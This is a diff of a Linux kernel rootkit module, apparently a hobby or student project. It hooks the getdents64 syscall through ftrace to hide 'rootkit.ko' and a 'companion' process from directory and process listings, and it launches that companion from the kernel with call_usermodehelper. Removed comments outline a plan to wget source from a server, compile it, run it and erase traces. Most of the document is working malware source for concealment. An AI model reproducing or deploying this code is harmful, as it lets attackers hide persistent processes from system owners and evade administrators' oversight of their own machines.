@@ -1,36 +1,32 @@
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/kernel.h>
-#include <linux/kallsyms.h>
-#include <asm/unistd.h>
-#include <linux/smp.h>
-#include <linux/preempt.h>
-#include <linux/vmalloc.h>
-#include <linux/ftrace.h>
-#include <linux/dirent.h>
-#include <linux/fs.h>
-#include <linux/string.h>
-#include <linux/ctype.h>
-#include <linux/file.h>
-#include <linux/stat.h>
-#include <linux/sched/signal.h>
+#include "hide.h"
 
-// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
-#pragma GCC optimize("-fno-optimize-sibling-calls")
+void launch_companion(void) {
+    char *argv[] = {"/start_companion", NULL};
+    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (r) {
+      printk(KERN_INFO "Companion launched\n");
+    }
+}
 
-struct ftrace_hook {
-    const char *name;
-    void *function;
-    void *original;
+void get_pid_companion(void) {
+    struct task_struct *task;
+    pid_t pid_buff = -1;
+    printk(KERN_INFO "PLEASE");
+    for_each_process(task) {
+      if (!strcmp(task->comm, "companion")) {
+        g_pid_companion = task->pid;
+        printk(KERN_INFO "PLEASE2");
+        break ;
+      }
+      pid_buff = task->pid;
+    }
+}
 
-    unsigned long address;
-    struct ftrace_ops ops;
-};
 
-int pid_companion = -1;
 
-static int find_sys_call_addr(struct ftrace_hook *hook) {
+
+static int find_sys_call_addr(t_ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name(hook->name);
     if (!hook->address) {
         printk(KERN_ERR "Failed to find syscall table\n");
@@ -42,13 +38,13 @@ static int find_sys_call_addr(struct ftrace_hook *hook) {
 
 static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
 {
-    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+    t_ftrace_hook *hook = container_of(ops, t_ftrace_hook, ops);
 
     if(!within_module(parent_ip, THIS_MODULE))
         ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
 }
 
-static int fh_install_hook(struct ftrace_hook *hook)
+int fh_install_hook(t_ftrace_hook *hook)
 {
     int err;
     err = find_sys_call_addr(hook);
@@ -83,7 +79,7 @@ static int fh_install_hook(struct ftrace_hook *hook)
     return 0;
 }
 
-static void fh_remove_hook(struct ftrace_hook *hook)
+void fh_remove_hook(t_ftrace_hook *hook)
 {
     int err;
     err = unregister_ftrace_function(&hook->ops);
@@ -98,8 +94,6 @@ static void fh_remove_hook(struct ftrace_hook *hook)
         printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
     }
 }
-
-static asmlinkage long (*original_call)(const struct pt_regs *);
 
 
 /*
@@ -121,21 +115,21 @@ static bool is_numeric(char *str) {
   return (i == strlen(str));
 }
 
-static asmlinkage long myGetDents(const struct pt_regs *regs) {
+asmlinkage long myGetDents(const struct pt_regs *regs) {
 
     printk(KERN_INFO "Hello there\n");
     int dirent_idx = 0;
     int buff_pid = -1;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
     struct linux_dirent64* dirent_buff;
-//   long int          count = regs->dx;
-//    long unsigned int fd = regs->di;
+//  long int          count = regs->dx;
+//  long unsigned int fd = regs->di;
 
-    int getdent_ret = original_call(regs);
+    int getdent_ret = g_original_getdents(regs);
 
-    if (getdent_ret <= 0) {
+    if (getdent_ret <= 0) 
         return getdent_ret;
-    }
+    
     void *dbuf = (void *)(dirent);
   //array of "string to hide"
     char *string_to_hide[] = {"rootkit.ko", NULL};
@@ -146,7 +140,7 @@ static asmlinkage long myGetDents(const struct pt_regs *regs) {
       int i = 0;
       if (is_numeric(dirent_buff->d_name)) {
         buff_pid = (int)simple_strtol(dirent_buff->d_name, NULL, 10);
-        if (buff_pid == pid_companion) {
+        if (buff_pid == g_pid_companion) {
             to_hide += dirent_buff->d_reclen;
             // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
             memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
@@ -162,7 +156,7 @@ static asmlinkage long myGetDents(const struct pt_regs *regs) {
           i++;
         }
       }
-    if (string_to_hide[i] == NULL || buff_pid != pid_companion) {
+    if (string_to_hide[i] == NULL || buff_pid != g_pid_companion) {
       // We increment only when it's not a match
       dirent_idx += dirent_buff->d_reclen;
     }
@@ -182,58 +176,3 @@ static asmlinkage long myGetDents(const struct pt_regs *regs) {
 
 
 
-static  struct ftrace_hook *f_hook[] = {&(struct ftrace_hook){
-    .name = "__x64_sys_getdents64",
-    .function = (myGetDents),
-    .original = (&original_call),
-}, NULL};
-
-static int __init rootkit_init(void) {
-    printk(KERN_INFO "%i\n", current->pid);
-    char *argv[] = {"/start_companion", NULL};
-    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-
-  // Protocol:
-
-  // Probably have to run a gcc .c
-  // We could host the .c on a github or any server
-  // So we would like download the .c, with a wget
-  // Then compile it gcc
-  // Then launch the companion
-  // Then remove all trace
-
-  // So it has to be obfuscate from ps : How do we get the PID ?
-  // It's possible to get the pid of a kernelModule with current->pid
-
-    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (r) {
-      printk(KERN_INFO "Rootkit has been loaded\n");
-    }
-    struct task_struct *task;
-    pid_t pid_buff = -1;
-   printk(KERN_INFO "PLEASE");
-    for_each_process(task) {
-      if (!strcmp(task->comm, "companion")) {
-        pid_companion = task->pid;
-        printk(KERN_INFO "PLEASE2");
-        break ;
-      }
-      pid_buff = task->pid;
-    }
-    printk(KERN_INFO "PID %d", pid_companion);
-    printk(KERN_INFO "pid %d", pid_companion);
-    if (fh_install_hook(f_hook[0])) {
-      printk(KERN_INFO "Bruh minstall hook eroor\n");
-    }
-
-    return 0;
-}
-
-static void __exit rootkit_exit(void) {
-    fh_remove_hook(f_hook[0]);
-    printk(KERN_INFO "Rootkit has been unloaded\n");
-}
-
-module_init(rootkit_init);
-module_exit(rootkit_exit);
-MODULE_LICENSE("GPL");
